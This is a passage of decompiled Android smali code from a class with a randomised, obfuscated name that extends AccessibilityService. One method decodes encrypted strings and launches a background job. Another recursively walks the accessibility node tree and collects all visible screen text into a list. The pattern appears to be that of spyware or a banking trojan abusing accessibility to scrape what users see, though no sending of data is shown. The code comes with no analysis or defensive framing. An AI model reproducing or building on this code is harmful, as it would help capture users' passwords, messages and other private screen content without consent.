    sget-object v3, Lb0/b;->a:Lb0/b;

    .line 3
    sget-object v3, Lb0/b;->a0:Ljava/lang/String;

    .line 4
    invoke-static {v1, v3, v0, v2}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v1

    if-eqz v1, :cond_6

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "applicationContext"

    invoke-static {v1, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    iget-object v2, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    .line 5
    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v3, :cond_1

    const-string v3, "settings"

    invoke-virtual {v1, v3, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    sput-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_1
    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v1}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v3, 0x0

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_2

    move v1, v0

    goto :goto_1

    .line 6
    :cond_2
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    :goto_1
    const/16 v2, 0xa

    if-le v1, v2, :cond_6

    .line 7
    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->j:Lz0/s0;

    const/4 v2, 0x1

    if-nez v1, :cond_3

    goto :goto_2

    .line 8
    :cond_3
    invoke-interface {v1}, Lz0/s0;->a()Z

    move-result v1

    if-ne v1, v2, :cond_4

    move v1, v2

    goto :goto_3

    :cond_4
    :goto_2
    move v1, v0

    :goto_3
    if-nez v1, :cond_5

    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    sget-object v4, Lz0/m0;->c:Lz0/m0;

    const/4 v5, 0x0

    new-instance v7, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo$c;

    invoke-direct {v7, p0, v1, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo$c;-><init>(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Ljava/lang/String;Ll0/d;)V

    const/4 v8, 0x3

    const/4 v9, 0x0

    const/4 v6, 0x0

    invoke-static/range {v4 .. v9}, Lb/a;->u(Lz0/x;Ll0/f;ILr0/c;ILjava/lang/Object;)Lz0/s0;

    move-result-object v1

    .line 9
    iput-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->j:Lz0/s0;

    :cond_5
    return v2

    .line 10
    :cond_6
    sget-object v1, Lj0/g;->a:Lj0/g;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_4

    :catchall_0
    move-exception v1

    invoke-static {v1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    move-result-object v1

    :goto_4
    invoke-static {v1}, Lj0/d;->a(Ljava/lang/Object;)Ljava/lang/Throwable;

    move-result-object v1

    if-eqz v1, :cond_7

    const-string v2, "ckdUVWZsNUsxakJPRWtSYlZjVUVxQm9RWkJ4emhabThoNTZQQkhZcXIzQT06OkxkbWVDUWUvL00yQlI5YUpVbHlrdlE9PQ=="

    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    const-string v2, "T1hocVJ4UnZxVVNqSHMxZlFxenNYdz09Ojp4YUJiWmhoNVFyZm5tZkVkTUtiMHdRPT0="

    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/Throwable;->getLocalizedMessage()Ljava/lang/String;

    .line 11
    sget-object v1, Lb0/b;->a:Lb0/b;

    :cond_7
    return v0
.end method

.method public final z(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/List;)V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/accessibility/AccessibilityNodeInfo;",
            "Ljava/util/List<",
            "Ljava/lang/String;",
            ">;)V"
        }
    .end annotation

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    if-nez v1, :cond_0

    goto :goto_0

    :cond_0
    :try_start_0
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_1

    goto :goto_0

    :cond_1
    invoke-static {v1}, Ly0/f;->M(Ljava/lang/CharSequence;)Z

    move-result v2

    xor-int/lit8 v2, v2, 0x1

    if-eqz v2, :cond_2

    invoke-interface {p2, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v1

    invoke-static {v1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_2
    :goto_0
    const/4 v1, 0x0

    if-lez v0, :cond_4

    :goto_1
    add-int/lit8 v2, v1, 0x1

    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    const-string v3, "childNodeInfo"

    invoke-static {v1, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, v1, p2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->z(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/List;)V

    if-lt v2, v0, :cond_3

    goto :goto_2

    :cond_3
    move v1, v2

    goto :goto_1

    :cond_4
    :goto_2
    return-void
.end method
